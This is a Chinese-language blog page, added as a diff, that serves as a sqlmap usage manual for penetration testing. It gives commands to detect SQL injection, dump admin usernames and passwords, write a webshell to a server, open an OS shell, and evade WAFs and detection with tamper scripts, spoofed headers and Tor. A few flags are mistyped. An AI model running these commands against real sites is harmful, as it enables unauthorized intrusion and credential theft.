@@ -1,0 +1,515 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>sqlmap使用手册 | lazy</title>
+  <meta name="author" content="lazy" />
+
+  
+  <meta name="description" content="不说太多，感觉进来看！！！" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="sqlmap使用手册" />
+  <meta property="og:site_name" content="lazy" />
+
+  
+  
+  
+  
+  
+
+  
+    <meta property="og:image" content="undefined" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="lazy" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">lazy</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/achieve">所有文章</a></li>
+    
+      <li><a href="/plan">学习计划</a></li>
+    
+      <li><a href="/developer">开发者</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+      <li><a href="http://www.cnblogs.com/lazy0">aother blog</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2015-06-21T15:26:30.000Z"><a href="/2015/06/21/sqlmap使用手册/">2015-06-21</a></time>
+      
+      
+  
+    <h1 class="title">sqlmap使用手册</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>不说太多，感觉进来看！！！<br><a id="more"></a></p>
+<h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介:"></a><a href="">sqlmap简介:</a></h2><hr>
+<p>SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，</p>
+<p>即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。</p>
+<p><a href="">sqlmap支持五种不同的注入模式：</a></p>
+<pre><code>1、基于布尔的盲注，9Boolean-based blind SQL injection)即可以根据返回页面判断条件真假的注入。
+
+2、基于时间的盲注，(Time-based blind SQL injection)即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+
+3、基于报错注入，(Error-based SQL injection)即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+
+4、联合查询注入,(UNION query SQL injection)可以使用union的情况下的注入。
+
+5、堆查询注入,(Stacked queries SQL injection)可以同时执行多条语句的执行时的注入。
+</code></pre><p><a href="">level等级:</a></p>
+<pre><code>0、只显示python错误以及严重的信息。
+
+1、同时显示基本信息和警告信息。（默认）
+
+2、同时显示debug信息。
+
+3、同时显示注入的payload。
+
+4、同时显示HTTP请求。
+
+5、同时显示HTTP响应头。
+
+6、同时显示HTTP响应页面。
+</code></pre><p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
+<p><a href="">sqlmap支持的数据库有:</a></p>
+<pre><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</code></pre><h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入:"></a><a href="">检测注入:</a></h2><hr>
+<p><a href="">基本格式:</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″
+</code></pre><p>默认使用level1检测全部数据库类型</p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –dbms mysql –level 3
+</code></pre><p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<p><a href="">跟随302跳转:</a></p>
+<p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br>当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br>目的就是：要追踪到错误信息。</p>
+<p><a href="">cookie注入:</a></p>
+<p>当程序有防get注入的时候，可以使用cookie注入</p>
+<pre><code>sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11″ –level 2（只有level达到2才会检测cookie）
+</code></pre><p><a href="">从post数据包中注入:</a></p>
+<p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数
+
+sqlmap -u “http://www.xx.cn/post.php?id=1″ --date &quot;tfUName=123$tfUPass=456&quot;
+</code></pre><p><a href="">伪静态注入：</a></p>
+<pre><code>sqlmap -u &quot;http://url/news/1*.html&quot; --dbs #在*插入SQL注入语句查询数据库
+
+sqlmap -u &quot;http://url/news/1*/html&quot; --dbs #在*插入SQL注入语句查询数据库
+</code></pre><h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后:"></a><a href="">注入成功后:</a></h2><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –dbms mysql –level 3 –dbs
+</code></pre><p><a href="">查询有哪些数据库:</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″--current-db
+</code></pre><p><a href="">查询当前数据库名:</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –-count –level 3 -D test 
+</code></pre><p><a href="">查询test数据库中数据的个数:</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –dbms mysql –level 3 -D test –tables
+</code></pre><p><a href="">查询test数据库中有哪些表:</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –dbms mysql –level 3 -D test -T admin –columns
+</code></pre><p><a href="">查询test数据库中admin表有哪些字段</a></p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
+</code></pre><p><a href="">dump出字段username与password中的数据:</a></p>
+<p>python sqlmap.py -g “inurl:\”.php?id=1\””</p>
+<h2 id="其他命令参考下面"><a href="#其他命令参考下面" class="headerlink" title="其他命令参考下面:"></a><a href="">其他命令参考下面:</a></h2><p><a href="">从数据库中搜索字段:</a></p>
+<pre><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
+</code></pre><p>在dedecms数据库中搜索字段admin或者password。</p>
+<p><a href="">读取与写入文件:</a></p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
+
+–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
+
+–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+
+//示例：
+sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
+</code></pre><p><a href="">使用shell命令：</a></p>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
+</code></pre><p><a href="">编码绕过WAF：</a></p>
+<pre><code>sqlmap -u &quot;http://url/news?id=1&quot; -v 3 --dbs --tamper &quot;space2morehash.py&quot;  
+
+用tamper选择编码表绕过WAF注入，更多见ramper目
+</code></pre><p><a href="">sqlmap详细命令：</a></p>
+<pre><code>–is-dba 当前用户权限（是否为root权限）
+–dbs 所有数据库
+–current-db 网站当前数据库
+–users 所有数据库用户
+–current-user 当前数据库用户
+–random-agent 构造随机user-agent
+–passwords 数据库密码
+–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理
+–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+</code></pre><p><a href="">从文本中获取多个目标检测：</a></p>
+<pre><code>www.target1.com/vuln1.php?q=foobar
+
+www.target2.com/vuln2.asp?id=1
+
+www.target3.com/vuln3/id/1*
+
+sqlmap -m  url.txt   #将url格式保存到文件，sqlmap会逐一检测
+</code></pre><p><a href="">伪装http头绕过工具识别：</a></p>
+<pre><code>sqlmap -u &quot;http://url/news?id=1&quot; --referer &quot;http://www.baidu.com&quot;    #从百度域超链接访问的
+
+sqlmap -u &quot;http://url/news?id=1&quot; --user-agent=&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; #设置浏览器信息
+
+sqlmap -u &quot;http://url/news?id=1&quot;  --mobile  #伪装成智能手机，设定一个手机的User-Agent来模仿手机登陆
+
+sqlmap.py -u &quot;http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&quot; --proxy &quot;http://192.168.1.47:3128&quot;#使用代理,配合TOR
+</code></pre><p><a href="">使用多线程:</a></p>
+<pre><code>sqlmap.py -u &quot;http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&quot; -v 1 --current-user --threads 3
+</code></pre><p><a href="">Options（选项):</a></p>
+<pre><code>–version 显示程序的版本号并退出
+-h, –help 显示此帮助消息并退出
+-v VERBOSE 详细级别：0-6（默认为1）
+</code></pre><p><a href="">Target（目标）：</a></p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<pre><code>-d DIRECT 直接连接到数据库。
+-u URL, –url=URL 目标URL。
+-l LIST 从Burp或WebScarab代理的日志中解析目标。
+-r REQUESTFILE 从一个文件中载入HTTP请求。
+-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+-c CONFIGFILE 从INI配置文件中加载选项。
+</code></pre><p><a href="">Request（请求）：</a></p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<pre><code>–data=DATA 通过POST发送的数据字符串
+–cookie=COOKIE HTTP Cookie头
+–cookie-urlencode URL 编码生成的cookie注入
+–drop-set-cookie 忽略响应的Set – Cookie头信息
+–user-agent=AGENT 指定 HTTP User – Agent头
+–random-agent 使用随机选定的HTTP User – Agent头
+–referer=REFERER 指定 HTTP Referer头
+–headers=HEADERS 换行分开，加入其他的HTTP头
+–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+–auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+–proxy=PROXY 使用HTTP代理连接到目标URL
+–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+–ignore-proxy 忽略系统默认的HTTP代理
+–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+–retries=RETRIES 连接超时后重新连接的时间（默认3）
+–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+–safe-url=SAFURL 在测试过程中经常访问的url地址
+–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+</code></pre><p><a href="">Enumeration（枚举）：</a></p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p>
+<pre><code>-b, –banner 检索数据库管理系统的标识
+–current-user 检索数据库管理系统当前用户
+–current-db 检索数据库管理系统当前数据库
+–is-dba 检测DBMS当前用户是否DBA
+–users 枚举数据库管理系统用户
+–passwords 枚举数据库管理系统用户密码哈希
+–privileges 枚举数据库管理系统用户的权限
+–roles 枚举数据库管理系统用户的角色
+–dbs 枚举数据库管理系统数据库
+-D DBname 要进行枚举的指定数据库名
+-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）
+–tables 枚举的DBMS数据库中的表
+–columns 枚举DBMS数据库表列
+–dump 转储数据库管理系统的数据库中的表项
+–dump-all 转储所有的DBMS数据库表中的条目
+–search 搜索列（S），表（S）和/或数据库名称（S）
+-C COL 要进行枚举的数据库列
+-U USER 用来进行枚举的数据库用户
+–exclude-sysdbs 枚举表时排除系统数据库
+–start=LIMITSTART 第一个查询输出进入检索
+–stop=LIMITSTOP 最后查询的输出进入检索
+–first=FIRSTCHAR 第一个查询输出字的字符检索
+–last=LASTCHAR 最后查询的输出字字符检索
+–sql-query=QUERY 要执行的SQL语句
+–sql-shell 提示交互式SQL的shell
+</code></pre><p><a href="">Optimization（优化）：</a></p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<pre><code>-o 开启所有优化开关
+–predict-output 预测常见的查询输出
+–keep-alive 使用持久的HTTP（S）连接
+–null-connection 从没有实际的HTTP响应体中检索页面长度
+–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+</code></pre><p><a href="">Injection（注入）：</a></p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<pre><code>-p TESTPARAMETER 可测试的参数（S）
+–dbms=DBMS 强制后端的DBMS为此值
+–os=OS 强制后端的DBMS操作系统为这个值
+–prefix=PREFIX 注入payload字符串前缀
+–suffix=SUFFIX 注入payload字符串后缀
+–tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+</code></pre><p><a href="">Detection（检测）：</a></p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）
+–risk=RISK 执行测试的风险（0-3，默认为1）
+–string=STRING 查询时有效时在页面匹配字符串
+–regexp=REGEXP 查询时有效时在页面匹配正则表达式
+–text-only 仅基于在文本内容比较网页
+</code></pre><p><a href="">Techniques（技巧）：</a></p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<pre><code>–technique=TECH SQL注入技术测试（默认BEUST）
+–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+–union-cols=UCOLS 定列范围用于测试UNION查询注入
+–union-char=UCHAR 用于暴力猜解列数的字符
+</code></pre><p><a href="">Fingerprint（指纹）：</a></p>
+<pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹
+</code></pre><p><a href="">Operating system access（操作系统访问）：</a></p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<pre><code>–os-cmd=OSCMD 执行操作系统命令
+–os-shell 交互式的操作系统的shell
+–os-pwn 获取一个OOB shell，meterpreter或VNC
+–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+–os-bof 存储过程缓冲区溢出利用
+–priv-esc 数据库进程用户权限提升
+–msf-path=MSFPATH Metasploit Framework本地的安装路径
+–tmp-path=TMPPATH 远程临时文件目录的绝对路径
+</code></pre><p><a href="">Windows注册表访问：</a></p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<pre><code>–reg-read 读一个Windows注册表项值
+–reg-add 写一个Windows注册表项值数据
+–reg-del 删除Windows注册表键值
+–reg-key=REGKEY Windows注册表键
+–reg-value=REGVAL Windows注册表项值
+–reg-data=REGDATA Windows注册表键值数据
+–reg-type=REGTYPE Windows注册表项值类型
+</code></pre><p>这些选项可以用来设置一些一般的工作参数。</p>
+<pre><code>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+–flush-session 刷新当前目标的会话文件
+–fresh-queries 忽略在会话文件中存储的查询结果
+–eta 显示每个输出的预计到达时间
+–update 更新SqlMap
+–save file保存选项到INI配置文件
+–batch 从不询问用户输入，使用所有默认配置。
+</code></pre><p>Miscellaneous（杂项）：</p>
+<pre><code>–beep 发现SQL注入时提醒
+–check-payload IDS对注入payloads的检测测试
+–cleanup SqlMap具体的UDF和表清理DBMS
+–forms 对目标URL的解析和测试形式
+–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+–page-rank Google dork结果显示网页排名（PR）
+–parse-errors 从响应页面解析数据库管理系统的错误消息
+–replicate 复制转储的数据到一个sqlite3数据库
+–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+–wizard 给初级用户的简单向导界面
+</code></pre><p>后续会继续添加，谢谢！！！</p>
+<p>有错误欢迎发邮件纠正！！大家相互学习！！！</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/渗透测试/">渗透测试</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/sqlmap/">sqlmap</a>, <a href="/tags/sql注入/">sql注入</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="widget tag">
+    <h3 class="title">关于文章</h3>
+    <div class="entry">
+    <P>文章有问题可以发邮件</p>
+    <p>大家彼此相互学习</p>
+      <p>邮箱：lazy@dropsec.xyz</p>
+    </div>
+</div>
+
+  <div class="widget tag">
+    <h3 class="title">赞助我</h3>
+    <div class="entry">
+      <img src='/css/images/qr_alipay.png' style='width:100%;background:rgba(255,255,255,0.6)' />
+    </div>
+</div>
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/MarkDown/" style="font-size: 10px;">MarkDown</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/sql注入，手工/" style="font-size: 10px;">sql注入，手工</a> <a href="/tags/sql注入，过狗，过waf/" style="font-size: 10px;">sql注入，过狗，过waf</a> <a href="/tags/上传绕过/" style="font-size: 15px;">上传绕过</a> <a href="/tags/常见路径/" style="font-size: 10px;">常见路径</a> <a href="/tags/手工注入，手工/" style="font-size: 10px;">手工注入，手工</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/渗透测试/" style="font-size: 20px;">渗透测试</a> <a href="/tags/渗透测试，命令执行/" style="font-size: 10px;">渗透测试，命令执行</a> <a href="/tags/脚本/" style="font-size: 10px;">脚本</a> <a href="/tags/过waf，过狗/" style="font-size: 10px;">过waf，过狗</a> <a href="/tags/逻辑漏洞/" style="font-size: 10px;">逻辑漏洞</a>
+  </div>
+</div>
+
+
+  
+  <div class="widget tag">
+    <h3 class="title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/06/">    2016年06月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/05/">    2016年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/04/">    2016年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/06/">    2015年06月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/05/">    2015年05月</a><span class="archive-list-count">6</span></li></ul>
+  </div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/python/">python</a><small>3</small></li>
+  
+    <li><a href="/categories/十大漏洞/">十大漏洞</a><small>4</small></li>
+  
+    <li><a href="/categories/杂谈/">杂谈</a><small>4</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>6</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">近期文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2016/06/10/python_端口扫描小工具/">python_端口扫描小工具</a>
+      </li>
+    
+      <li>
+        <a href="/2016/06/07/phpcms_2008远程代码执行漏洞/">phpcms-2008 远程代码执行漏洞</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/30/python_json模块/">python之json模块</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/27/python正则表达式/">python之正则表达式</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/28/十大漏洞之远程命令执行/">十大漏洞之命令执行</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  <div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <div class="entry">
+    <ul>
+<!-- link start -->
+<li><a href='http://www.cnblogs.com/lazy0'>lazy</a></li>
+<li><a href='http://www.dropsec.xyz/'>Drops实验室</a></li>
+<li><a href='http://byd.dropsec.xyz/'>毕老师</a></li>
+<li><a href='http://blog.neargle.com/'>斌哥</a></li>
+<li><a href='http://fgp.dropsec.xyz//'>鹏哥</a></li>
+<!-- link  end -->
+    </ul>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+    <h3 class="title">统计</h3>
+    <div class="entry">
+      
+	<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+
+    </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="alignleft">
+<span id="busuanzi_container_site_pv">
+    你好，你是第:<span id="busuanzi_value_site_pv"></span>位访客
+</span>
+</div>
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+</footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+<script>
+    //Kill XP and IE8
+    (function(){
+        var ua = navigator.userAgent;
+        var res = /Windows NT (\d+\.\d+)/.exec(ua);
+        var xpOrLower = res && JSON.parse(res[1]) < 6;
+        res = /MSIE (\d+\.\d+)/.exec(ua);
+        var ie8OrLower = res && JSON.parse(res[1]) < 9;
+        if(xpOrLower || ie8OrLower)
+        {
+            alert('请不要用XP及之前的Windows系统，和IE8及之前的IE浏览器访问本站！');
+            location.href = "about:blank";
+        }
+        var fromBaiduSE = /^https?:\/\/www.baidu.com/.test(document.referrer);
+        if(fromBaiduSE)
+        {
+            alert('检测到你还在使用百度搜索，作为一个程序员，这是一种自暴自弃！\n\n做不作恶的程序员，从不用百度开始！')
+            location.href = "about:blank";
+        }
+    })();
+</script>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script> 
+//前面要添加的代码  
+//百度统计的代码  
+
+<div id='bg'></div>
+</body>
+</html>
